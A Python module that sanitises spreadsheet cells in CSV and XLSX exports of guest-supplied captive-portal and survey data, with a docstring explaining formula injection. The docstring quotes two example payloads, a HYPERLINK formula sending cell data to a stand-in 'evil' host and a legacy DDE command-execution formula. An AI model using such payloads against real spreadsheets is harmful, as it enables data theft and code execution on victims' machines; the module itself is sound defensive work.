"""Neutralise spreadsheet formulas in exported cell values.

A guest types their own identifier at the captive portal and their own answers
into a survey. ``normalize_redeemed_identifier`` strips whitespace and nothing
else, by design. Those strings are then written into CSV and XLSX files that a
venue owner downloads and opens in Excel, Numbers or LibreOffice -- and a cell
whose text begins ``=``, ``+``, ``-``, ``@`` is not text to a spreadsheet, it
is a formula, evaluated on open on the owner's machine.

That is the whole attack: a guest registers as ``=HYPERLINK("http://evil/"&A1)``
or a legacy ``=cmd|'/c calc'!A1``, the venue owner exports their guest list a
week later, and the spreadsheet runs it. The guest never has to touch the
owner's machine; the export carries the payload for them.

The five affected writers, all of which carry guest-supplied text:

* ``analytics.export._render_csv`` / ``_render_excel`` -- report exports
  (guest identifiers, device strings, top-guest tables)
* ``controller_logs.router._csv_response`` -- guest authentication logs
* ``campaigns.service.export_results_csv`` -- survey answers, which are
  literally guest free text
* ``voucher.service.export_batch_csv`` -- ``redeemed_identifier``

## Why prefixing with an apostrophe, and why not just CSV-quote

CSV quoting (which ``csv.writer`` already does correctly) protects the *file
format* -- it stops a comma or newline breaking the row. It does nothing about
formulas, because the danger is not in how the value is delimited but in what
the spreadsheet does with it after parsing. ``"=1+1"`` is a perfectly
well-formed quoted CSV field and still evaluates.

The apostrophe prefix is the portable answer: every major spreadsheet reads a
leading ``'`` as "treat the rest as literal text" and does not display it.
OWASP recommends exactly this. It is applied only to values that actually
begin with a dangerous character, so ordinary data is untouched and a
round-trip through the export is otherwise byte-identical.

## Why the XLSX writer needs it too

``openpyxl`` infers a cell's type from the value: assigning a ``str`` that
begins with ``=`` produces a real **formula cell**, not a text cell. So the
Excel export is not merely as exposed as the CSV -- it is worse, since the
formula is stored as a formula rather than needing the spreadsheet to
re-interpret it on import.

PDF exports are not affected: reportlab draws text, nothing evaluates it.
"""

from __future__ import annotations

__all__ = ["sanitize_spreadsheet_cell", "sanitize_spreadsheet_row"]

# Leading characters a spreadsheet treats as the start of a formula. The tab
# and carriage return are here because Excel strips leading whitespace before
# deciding, so "\t=1+1" is still a formula.
_FORMULA_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def sanitize_spreadsheet_cell(value: object) -> object:
    """Return ``value`` safe to write into a spreadsheet cell.

    Non-strings pass through untouched -- an ``int``, a ``datetime`` or ``None``
    cannot carry a formula, and stringifying them here would change the type
    the writer records (``openpyxl`` would store a number as text, and every
    numeric column in an exported report would stop summing).

    A string is prefixed with ``'`` only if it begins with a formula
    character. Note that a negative number arriving already stringified (say
    ``"-5"``) is prefixed too: that is the correct trade-off, because this
    function cannot distinguish "the number minus five" from "the start of a
    formula", and the writers hand it real numeric types for real numbers.
    """
    if not isinstance(value, str):
        return value
    if value.startswith(_FORMULA_PREFIXES):
        return "'" + value
    return value


def sanitize_spreadsheet_row(row: list[object]) -> list[object]:
    """``sanitize_spreadsheet_cell`` across one row."""
    return [sanitize_spreadsheet_cell(cell) for cell in row]
